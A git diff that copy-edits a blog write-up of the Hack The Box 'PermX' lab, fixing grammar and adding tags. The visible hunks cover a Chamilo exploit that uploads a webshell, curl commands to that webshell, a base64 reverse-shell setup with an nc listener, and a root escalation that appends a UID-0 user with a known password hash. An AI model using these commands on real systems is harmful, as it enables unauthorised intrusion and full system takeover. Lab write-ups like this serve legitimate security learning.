@@ -6,6 +6,7 @@ pubDate: 2020-03-02T00:00:00Z
 // imgSrc: '/assets/images/image-post5.jpeg'
 imgSrc: '/assets/images/permxup.png'
 imgAlt: 'Image post 5'
+tags: ['htb', 'linux', 'easy', 'rce', 'privesc']
 ---
 
 
@@ -14,12 +15,12 @@ by Roqeeb
 
 ## Introduction
 
-In this write-up, i covered the steps taken to compromise the "Permx" box from htb, the lab was straightforward and very beginner friendly ,this is a writeup of how i exploited it
+In this write-up, I covered the steps taken to compromise the "PermX" box from HTB. The lab was straightforward and very beginner friendly.
 
 ### Target Overview
 
 - **Box Name:** Permx
-- **Difficulty** Easy
+- **Difficulty:** Easy
 - **IP Address:** 10.10.11.23
 -
 
@@ -29,7 +30,7 @@ This write-up is intended for educational purposes and to provide insight into t
 
 ### Nmap Scan
 
-To start the enumeration, i used rustscan to identify open ports and services running on the target machine.
+To start the enumeration, I used Rustscan to identify open ports and services running on the target machine.
 
 ```bash
 rustscan -a -t 2000 permx.htb -- -sC -sV -oA nmap -Pn
@@ -84,7 +85,7 @@ Starting gobuster in directory enumeration mode
 /js                   (Status: 301) [Size: 303] [--> http://permx.htb/js/]
 /404.html             (Status: 200) [Size: 10428]
 ```
-going through the pages of permx.htb and proxying the traffic through burpsuite i didnt find any vulnerabilty i could exploit so moving ahead to subdomain enumeration
+Going through the pages of `permx.htb` and proxying the traffic through Burp Suite, I didn't find any vulnerability I could exploit — moving on to subdomain enumeration.
 
 ### Subdomain Enumeration with Wfuzz
 
@@ -114,7 +115,7 @@ Requests/sec.: 49.77654
 ---
 ```
 
-we were able to discover 2 submaoins www and lms, the only thing we need is lms
+We discovered 2 subdomains — `www` and `lms`. The only one we need is `lms`.
 #### Adding Subdomain and Initial Exploitation
 
  Adding `lms.permx.htb` to Hosts File
@@ -149,7 +150,7 @@ The script requires the target URL with Chamilo's root path (e.g., `http://examp
 python3 poc.py -u http://lms.permx.htb -a scan
 [+] Target is likely vulnerable. Go ahead. [+]
 ```
-i got a positive response indicating the webapp might be vulnerable
+I got a positive response indicating the webapp might be vulnerable.
 ## Exploiting the Vulnerability
 
 Since the web service was found to be vulnerable, I proceeded to exploit it by creating a web shell.
@@ -160,14 +161,14 @@ Since the web service was found to be vulnerable, I proceeded to exploit it by c
 ```
 Enter the name of the webshell file that will be placed on the target server (default: webshell.php): bam
 ```
-i was asked to chose a name for the webshell so i chose a random name "bam"
+I was asked to choose a name for the webshell, so I chose "bam".
 
-after that the websell was created and i was given the url to access it
+After that, the webshell was created and I was given the URL to access it:
 ```bash
 [+] Upload successfull [+]
 Webshell URL: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/bam.php?cmd=<command>
 ```
-testing it the webshell works 
+Testing it — the webshell works:
 ```
 curl http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/bam.php?cmd=id 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -175,7 +176,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 ### Obtaining a Reverse Shell
 
-To gain access to the system, I used the ncreated web shell to execute a reverse shell payload.
+To gain access to the system, I used the newly created webshell to execute a reverse shell payload.
 
 1. **Execute the Payload**: I crafted a `curl` command to send a base64-encoded payload to the web shell. The payload was decoded and executed via the web shell. The command used was:
    ```bash
@@ -213,12 +214,11 @@ zsh: suspended  nc -lnvp 4444
 <c/lib/javascript/bigupload/files$ export TERM=xterm                     
 www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ 
 ```
-now we have a fully interactive shell
-i being enumeration for privesc
+Now we have a fully interactive shell. I began enumeration for privesc.
 
 ---
-after manually browsing through config files looking for creds or any other information i can leverage i decided it's time to download 
-'linpeash.sh' onto the box
+
+After manually browsing through config files looking for credentials or any other useful information, I decided it was time to download `linpeas.sh` onto the box.
 ### Downloading linpeas.sh Using a Python Web Server
 
 To transfer `linpeas.sh` from my local PC to the target machine, I used a Python web server. Here are the steps I followed:
@@ -251,7 +251,7 @@ After running `linpeas.sh` and reviewing the results, several items caught my at
 - **Database Password**: Identified a database password that could be useful for accessing services or further escalation.
 
 
-I decided to follow the easier path of trying the found passwords for passwprd reuse:
+I decided to follow the easier path of trying the found passwords for password reuse:
 ![configpass](https://github.com/user-attachments/assets/e538fa1a-df49-46bd-8ab2-9f056223d77d)
 
 1. **Attempting Password Reuse**:
@@ -342,12 +342,10 @@ Given the script's functionality, it was possible to exploit it as follows:
 `
   ### Update `passwd` and `shadow` Files
 
-- Edit the `/home/mtz/passwd` and `/home/mtz/shadow` files to add a new root user with a known password hash.generate your own
-- password hash with openssl and if you want to use mine the pasword is 'naruto'
+- Edit the `/home/mtz/passwd` and `/home/mtz/shadow` files to add a new root user with a known password hash. Generate your own hash with `openssl` — if you want to use mine, the password is `naruto`.
 
   ```bash
   echo 'chef:x:0:0:root:/root:/bin/bash' >> /home/mtz/passwd
   echo 'chef:$6$m.8UCPi1Mj9FRFMK$OR6ubVYKZzE9UFiGm4ahw0t680nd5m//Wj55/0apx9NjfyOML8bvTi19Bh7JfAEW0wm59BE5dp17VrKpu8UCI0:19742:0:99999:7:::' >> /home/mtz/shadow
 `
-switch to the new user 'chef' and youre root
-i also wrote a script that does the escalation from mtz to root easily check the folder
+Switch to the new user `chef` and you're root. I also wrote a script that automates the escalation from `mtz` to root — check the folder.
